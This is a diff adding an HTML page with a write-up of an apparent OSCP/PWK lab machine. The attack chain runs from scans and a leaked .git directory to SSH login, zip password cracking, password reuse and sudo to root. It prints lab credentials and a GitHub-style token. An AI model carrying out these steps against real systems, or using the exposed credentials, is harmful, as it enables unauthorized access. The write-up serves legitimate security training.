@@ -1,0 +1,265 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX144</h1>
+    <h2 class="subtitle">Enumeratino</h2>
+    <div class="code-box"><pre><code>┌──(venv)─(kali㉿kali)-[~/tempo/OSCPA/144]
+└─$ sudo nmap -p- -sCV 192.168.206.144 --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-24 22:08 EST
+Nmap scan report for 192.168.206.144
+Host is up (0.12s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
+|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Home
+| http-git: 
+|   192.168.206.144:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: Security Update 
+|     Remotes:
+|_      https://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@github.com/PWK-Challenge-Lab/dev.git
+|_http-generator: Nicepage 4.21.12, nicepage.com</code></pre></div>
+
+<p class="text">HTTP is open. I enumerated its directories with gobuster.</p>
+<div class="code-box"><pre><code>┌──(venv)─(kali㉿kali)-[~/tempo/OSCPA/144]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.214.144/ -t 50            
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.214.144/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.git/config          (Status: 200) [Size: 306]
+/.git/HEAD            (Status: 200) [Size: 21]
+/.git/index           (Status: 200) [Size: 730]
+/.git                 (Status: 301) [Size: 317] [--> http://192.168.214.144/.git/]
+/.htpasswd            (Status: 403) [Size: 280]
+/.git/logs/           (Status: 200) [Size: 1134]
+/.hta                 (Status: 403) [Size: 280]
+/.htaccess            (Status: 403) [Size: 280]
+/cms                  (Status: 301) [Size: 316] [--> http://192.168.214.144/cms/]
+/images               (Status: 301) [Size: 319] [--> http://192.168.214.144/images/]
+/index.html           (Status: 200) [Size: 46103]
+/server-status        (Status: 403) [Size: 280]
+Progress: 4746 / 4746 (100.00%)
+===============================================================</code></pre></div>
+
+<p class="text">I found .git leaked.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux/git-dumper]
+└─$ python3 git_dumper.py http://192.168.214.144/.git ~/tempo
+/home/kali/utils/Linux/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
+  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
+Warning: Destination '/home/kali/tempo' is not empty
+[-] Testing http://192.168.214.144/.git/HEAD [200]
+[-] Testing http://192.168.214.144/.git/ [200]
+...</code></pre></div>
+
+<p class="text">┌──(kali㉿kali)-[~/tempo/api]
+└─$ git log                                                                  
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:57:12 2022 +0200
+
+    Create database.php
+
+commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:56:19 2022 +0200
+
+    Delete database.php
+...</p>
+<p class="text">I found interesting logs.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/api]
+└─$ git diff 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 621a2e79b3a4a08bba12effe6331ff4513bad91a
+diff --git a/configuration/database.php b/configuration/database.php
+index 8ad08b0..55b1645 100644
+--- a/configuration/database.php
++++ b/configuration/database.php
+@@ -2,9 +2,8 @@
+ class Database{
+     private $host = "localhost";
+     private $db_name = "staff";
+-    private $username = "";
+-    private $password = "";
+-// Cleartext creds cannot be added to public repos!
++    private $username = "stuart@challenge.lab";
++    private $password = "BreakingBad92";
+     public $conn;
+     public function getConnection() {
+         $this->conn = null;</code></pre></div>
+
+<p class="text">I found credential in logs.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/api]
+└─$ ssh stuart@192.168.214.144                            
+The authenticity of host '192.168.214.144 (192.168.214.144)' can't be established.
+ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:45: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.214.144' (ED25519) to the list of known hosts.
+stuart@192.168.214.144's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Dec  4 08:21:35 AM UTC 2025
+
+  System load:  0.0                Processes:               201
+  Usage of /:   39.9% of 18.53GB   Users logged in:         0
+  Memory usage: 7%                 IPv4 address for ens160: 192.168.214.144
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
+stuart@oscp:~$ </code></pre></div>
+
+<p class="text">Successfully logged on.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>stuart@oscp:/opt/backup$ pwd
+/opt/backup
+stuart@oscp:/opt/backup$ ls
+sitebackup1.zip  sitebackup2.zip  sitebackup3.zip</code></pre></div>
+<p class="text">I found three zip files.</p>
+<div class="code-box"><pre><code>stuart@oscp:/opt/backup$ file *
+sitebackup1.zip: data
+sitebackup2.zip: data
+sitebackup3.zip: Zip archive data, at least v2.0 to extract, compression method=store</code></pre></div>
+
+<p class="text">sitebackup3.zip is only actual zip file. I installed this zip file and cracked password.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/api]
+└─$ scp stuart@192.168.214.144:/opt/backup/sitebackup3.zip .
+stuart@192.168.214.144's password: 
+sitebackup3.zip                                                                                100%   25KB  81.8KB/s   00:00 </code></pre></div>
+<p class="text">Then, I decrypted it with john.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/api]
+└─$ zip2john sitebackup3.zip > zip.john
+    
+┌──(kali㉿kali)-[~/tempo/api]
+└─$ john zip.john --wordlist=/usr/share/wordlists/rockyou.txt
+sitebackup3.zip/joomla/.DS_Store:codeblue:joomla/.DS_Store:sitebackup3.zip:sitebackup3.zip
+sitebackup3.zip/joomla/LICENSE.txt:codeblue:joomla/LICENSE.txt:sitebackup3.zip:sitebackup3.zip
+sitebackup3.zip/joomla/README.txt:codeblue:joomla/README.txt:sitebackup3.zip:sitebackup3.zip</code></pre></div>
+<p class="tex">I cracked the password codeblue.</p>
+
+
+<p class="text">I unziped this zip file and found interesting information.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/api]
+└─$ 7z x sitebackup3.zip
+    
+┌──(kali㉿kali)-[~/tempo/api/joomla]
+└─$ ls
+administrator  cli                htaccess.txt  index.php  libs         modules     robots.txt  web.config.txt
+api            components         images        language   LICENSE.txt  plugins     templates
+cache          configuration.php  includes      layouts    media        README.txt  tmp
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/api/joomla]
+└─$ cat configuration.php
+&lt;?php
+class JConfig {
+        public $offline = false;
+        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
+        public $display_offline_message = 1;
+        public $offline_image = '';
+        public $sitename = 'Challenge Lab';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = 20;
+        public $access = 1;
+        public $debug = false;
+        public $debug_lang = false;
+        public $debug_lang_const = true;
+        public $dbtype = 'mysql';
+        public $host = 'localhost';
+        public $user = 'joomla';
+        public $password = 'Password@1';
+        public $db = 'jooml';
+        public $dbprefix = 'o83rl_';
+        public $dbencryption = 0;
+        public $dbsslverifyservercert = false;
+        public $dbsslkey = '';
+        public $dbsslcert = '';
+        public $dbsslca = '';
+        public $dbsslcipher = '';
+        public $force_ssl = 0;
+        public $live_site = '';
+        public $secret = 'Ee24zIK4cDhJHL4H';
+        public $gzip = false;</code></pre></div>
+
+
+        <p class="text">I could change user to chloe using the secret password.</p>
+
+        <div class="code-box"><pre><code>stuart@oscp:/home$ su chloe
+Password: 
+To run a command as administrator (user "root"), use "sudo &lt;command>".
+See "man sudo_root" for details.
+
+chloe@oscp:/home$ </code></pre></div>
+
+
+<p class="text">She has privilege to run all command with sudo.</p>
+<div class="code-box"><pre><code>chloe@oscp:/home$ sudo -l
+[sudo] password for chloe: 
+
+Sorry, try again.
+[sudo] password for chloe: 
+Sorry, try again.
+[sudo] password for chloe: 
+Matching Defaults entries for chloe on oscp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User chloe may run the following commands on oscp:
+    (ALL : ALL) ALL
+chloe@oscp:/home$ </code></pre></div>
+
+<div class="code-box"><pre><code>chloe@oscp:/home$ sudo bash
+root@oscp:/home# whoami                                                                                                          
+root                                                                                                                             
+root@oscp:/home# id                                                                                                              
+uid=0(root) gid=0(root) groups=0(root)                                                                                           
+root@oscp:/home# </code></pre></div>
+
+</body>
+</html>
